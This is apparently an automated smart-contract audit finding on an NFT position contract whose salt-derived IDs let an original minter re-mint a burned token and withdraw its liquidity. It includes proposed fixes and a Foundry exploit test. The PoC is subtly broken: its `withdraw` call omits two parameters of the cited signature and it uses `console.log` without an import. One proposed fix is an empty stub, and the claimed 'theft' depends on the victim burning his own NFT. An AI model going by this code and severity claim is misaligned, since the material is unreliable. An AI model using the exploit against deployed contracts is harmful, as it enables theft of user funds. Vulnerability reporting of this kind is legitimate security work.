## Title
Original Minter Can Steal Transferred Positions/Orders via Burn-and-Re-mint Attack

## Summary
The `mint(bytes32 salt)` function generates deterministic NFT IDs based on the **original minter's address**, allowing the original minter to recreate any burned NFT. When an NFT is transferred to a new owner and subsequently burned, the original minter can re-mint the same NFT ID and gain unauthorized access to positions or orders that rightfully belong to the previous owner. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/BaseNonfungibleToken.sol` (lines 123-126, function `mint(bytes32 salt)`)

**Intended Logic:** The NFT system is designed to allow users to mint position/order NFTs with deterministic IDs for gas efficiency and predictability. The comment at line 130 states that burned NFTs can be "recreated by the original minter by reusing the salt" to enable gas refunds. [2](#0-1) 

**Actual Logic:** The deterministic ID generation uses `saltToId(msg.sender, salt)` which incorporates the **caller's address** (original minter), not the current NFT owner. This creates a permanent backdoor where the original minter can always recreate a burned NFT, even after transferring it to another user. [3](#0-2) 

**Exploitation Path:**

1. **Alice mints NFT and deposits liquidity**: Alice calls `mint(salt_X)` to mint NFT with deterministic ID. Alice deposits significant liquidity (e.g., $1M worth) into a position. [4](#0-3) 

2. **Alice transfers NFT to Bob**: Alice transfers the NFT to Bob (via sale, gift, or as collateral in a DeFi protocol). Bob now owns the NFT and has authorization to manage the position through the `authorizedForNft` modifier. [5](#0-4) 

3. **Bob burns the NFT**: Bob burns the NFT, either intentionally (to claim gas refund as the comment suggests) or accidentally (smart contract bug, user mistake). The position data in Core **is not deleted** - only the NFT ownership is destroyed. [6](#0-5) 

4. **Alice re-mints the same NFT ID**: Alice calls `mint(salt_X)` again with the original salt. Since the ID is computed as `keccak256(Alice_address, salt_X, chainid, contract_address)`, Alice gets the **exact same NFT ID** back and becomes the new owner.

5. **Alice steals Bob's position**: Alice now passes the `authorizedForNft(id)` check and can withdraw all liquidity and fees that Bob deposited or accumulated. Bob loses his entire position. [7](#0-6) 

**Security Property Broken:** 
- **Withdrawal Availability Invariant**: Bob can no longer withdraw his position after Alice steals the NFT
- **NFT Ownership Integrity**: Transferred NFT ownership should be exclusive and irrevocable
- **Direct Theft of User Funds**: Unauthorized access to positions and accumulated fees

## Impact Explanation
- **Affected Assets**: All liquidity positions and TWAMM orders represented by NFTs. Any user who purchases/receives a transferred NFT is at risk.
- **Damage Severity**: Complete loss of position liquidity and all accumulated fees. Attacker can drain 100% of the victim's position value. For a $1M position, the victim loses $1M.
- **User Impact**: Any user who receives an NFT via transfer (purchase, gift, DeFi protocol interaction) and subsequently burns it. This creates a rug-pull vector where malicious users can sell NFTs, wait for the buyer to burn them, then steal the positions. Affects both Positions and Orders contracts.

## Likelihood Explanation
- **Attacker Profile**: Original NFT minter. Requires no special privileges - any user who mints an NFT can exploit this.
- **Preconditions**: 
  1. Attacker mints NFT and deposits valuable position
  2. Attacker transfers NFT to victim
  3. Victim burns the NFT (encouraged by the "gas refund" comment in code)
- **Execution Complexity**: Simple - just call `mint(salt)` after victim burns. Can be automated with frontrunning bots to immediately steal any burned NFT.
- **Frequency**: Can be exploited once per NFT transfer-and-burn cycle. With many users and DeFi integrations, this creates a persistent attack surface.

## Recommendation

**Option 1: Prevent Re-minting After Transfer (Recommended)**
Track whether an NFT has ever been transferred. If transferred and burned, prevent the original minter from re-minting:

```solidity
// In src/base/BaseNonfungibleToken.sol

// Add storage mapping
mapping(uint256 => bool) private _hasBeenTransferred;

// Override _transfer to track transfers
function _afterTokenTransfer(address from, address to, uint256 id) internal virtual override {
    if (from != address(0) && from != to) {
        _hasBeenTransferred[id] = true;
    }
}

// Modified mint function
function mint(bytes32 salt) public payable returns (uint256 id) {
    id = saltToId(msg.sender, salt);
    // Prevent re-minting if NFT was previously transferred
    require(!_hasBeenTransferred[id], "Cannot re-mint transferred NFT");
    _mint(msg.sender, id);
}
```

**Option 2: Include Current Owner in Position ID**
Modify position/order identification to include the current NFT owner, not just the NFT ID. This breaks the association when ownership changes. However, this requires significant Core contract changes.

**Option 3: Force Position Withdrawal on Burn**
Automatically withdraw positions when an NFT is burned, preventing the backdoor access:

```solidity
// In src/base/BasePositions.sol
function burn(uint256 id) external payable override authorizedForNft(id) {
    // Force withdrawal of all positions associated with this NFT
    // This would require iterating over positions or maintaining a mapping
    _burn(id);
}
```

## Proof of Concept

```solidity
// File: test/Exploit_BurnRemintTheft.t.sol
// Run with: forge test --match-test test_BurnRemintTheft -vvv

pragma solidity ^0.8.31;

import {FullTest} from "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";

contract Exploit_BurnRemintTheft is FullTest {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    function setUp() public override {
        super.setUp();
        // Give Alice and Bob initial tokens
        token0.mint(alice, 1000e18);
        token1.mint(alice, 1000e18);
    }
    
    function test_BurnRemintTheft() public {
        // Create a pool
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        
        // STEP 1: Alice mints NFT with specific salt and deposits liquidity
        vm.startPrank(alice);
        bytes32 attackSalt = bytes32(uint256(0x1234));
        
        token0.approve(address(positions), 100e18);
        token1.approve(address(positions), 100e18);
        
        (uint256 aliceNftId, uint128 liquidity,,) = 
            positions.mintAndDepositWithSalt(attackSalt, poolKey, -100, 100, 100e18, 100e18, 0);
        
        assertEq(positions.ownerOf(aliceNftId), alice, "Alice should own NFT");
        assertGt(liquidity, 0, "Position should have liquidity");
        
        // STEP 2: Alice transfers NFT to Bob (simulating a sale or gift)
        positions.transferFrom(alice, bob, aliceNftId);
        vm.stopPrank();
        
        assertEq(positions.ownerOf(aliceNftId), bob, "Bob should now own NFT");
        
        // STEP 3: Bob burns the NFT (thinking he's done with it or to claim gas refund)
        vm.prank(bob);
        positions.burn(aliceNftId);
        
        // NFT no longer exists
        vm.expectRevert();
        positions.ownerOf(aliceNftId);
        
        // BUT: Position data still exists in Core with liquidity!
        (uint128 remainingLiquidity,,,,) = positions.getPositionFeesAndLiquidity(aliceNftId, poolKey, -100, 100);
        assertEq(remainingLiquidity, liquidity, "Position still exists in Core");
        
        // STEP 4: Alice re-mints the same NFT using the original salt
        vm.startPrank(alice);
        uint256 remintedId = positions.mint(attackSalt);
        
        // Alice gets the SAME NFT ID back!
        assertEq(remintedId, aliceNftId, "Alice re-minted the same NFT ID");
        assertEq(positions.ownerOf(remintedId), alice, "Alice owns the re-minted NFT");
        
        // STEP 5: Alice steals Bob's position by withdrawing all liquidity
        uint256 aliceToken0Before = token0.balanceOf(alice);
        uint256 aliceToken1Before = token1.balanceOf(alice);
        
        (uint128 withdrawn0, uint128 withdrawn1) = 
            positions.withdraw(remintedId, poolKey, -100, 100, liquidity);
        
        vm.stopPrank();
        
        // VERIFY: Alice successfully withdrew Bob's position
        assertGt(withdrawn0, 0, "Alice withdrew token0");
        assertGt(withdrawn1, 0, "Alice withdrew token1");
        assertEq(token0.balanceOf(alice) - aliceToken0Before, withdrawn0, "Alice received stolen token0");
        assertEq(token1.balanceOf(alice) - aliceToken1Before, withdrawn1, "Alice received stolen token1");
        
        // Bob lost everything - cannot access the position anymore
        console.log("EXPLOIT SUCCESS: Alice stole Bob's position worth", withdrawn0, "token0 and", withdrawn1, "token1");
    }
}
```

**Notes:**

The vulnerability exists because NFT ID generation is tied to the **original minter's address** rather than being truly unique per minting event. The explicit comment "The same ID can be recreated by the original minter by reusing the salt" confirms this is intentional design, but it creates a critical security flaw when combined with NFT transferability.

This violates the core principle of NFT ownership - once transferred, the previous owner should have no special rights. The current implementation allows original minters to maintain permanent "admin access" to any NFT they create, even after selling it.

The attack is practical and can be automated: malicious actors can sell high-value position NFTs, wait for buyers to burn them (perhaps after the position becomes unprofitable or the buyer wants a gas refund), then immediately steal the positions back.

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L92-102)
```text
    function saltToId(address minter, bytes32 salt) public view returns (uint256 result) {
        assembly ("memory-safe") {
            let free := mload(0x40)
            mstore(free, minter)
            mstore(add(free, 32), salt)
            mstore(add(free, 64), chainid())
            mstore(add(free, 96), address())

            result := keccak256(free, 128)
        }
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L123-126)
```text
    function mint(bytes32 salt) public payable returns (uint256 id) {
        id = saltToId(msg.sender, salt);
        _mint(msg.sender, id);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L128-131)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Can be used to refund some gas after the NFT is no longer needed.
    ///      The same ID can be recreated by the original minter by reusing the salt.
    ///      Only the token owner or approved addresses can burn the token.
```

**File:** src/base/BaseNonfungibleToken.sol (L133-135)
```text
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```

**File:** src/base/BasePositions.sol (L120-133)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L172-183)
```text
    function mintAndDepositWithSalt(
        bytes32 salt,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) external payable returns (uint256 id, uint128 liquidity, uint128 amount0, uint128 amount1) {
        id = mint(salt);
        (liquidity, amount0, amount1) = deposit(id, poolKey, tickLower, tickUpper, maxAmount0, maxAmount1, minLiquidity);
    }
```
